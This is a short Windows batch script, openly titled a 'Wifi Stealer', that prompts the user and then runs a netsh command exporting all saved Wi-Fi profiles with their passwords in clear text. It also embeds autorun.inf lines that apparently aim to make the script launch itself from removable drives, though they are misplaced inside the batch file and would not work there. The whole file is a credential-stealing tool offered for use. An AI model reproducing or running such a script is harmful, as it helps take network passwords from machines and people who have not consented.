@echo off
goto :GUI

:GUI
cls
title Wifi Stealer in batch
echo Welcome to the wifi stealer maked in batch!
set /p question="You ready to steal wifi password?:"

IF /I "%question%" == "yes" (
	GOTO ready
	)

IF /I "%question%" == "Yes" (
	GOTO ready
	)

IF /I "%question%" == "no" (
	GOTO notready
	)

IF /I "%question%" == "No" (
        GOTO notready
        )

CLS
echo.
echo Invalid choice
echo Please give proper choice!
pause
GOTO GUI

:: If user say yes

:ready

@echo off
title Stealing password wifis...
echo Stealing password wifis networks in progress!
netsh wlan export profile key=clear
[autorun]
open=new.bat
icon=new.bat,0
echo Succesfully stealed!
pause

:: If user say no

:notready
echo Press any key to exit this program...
pause >nul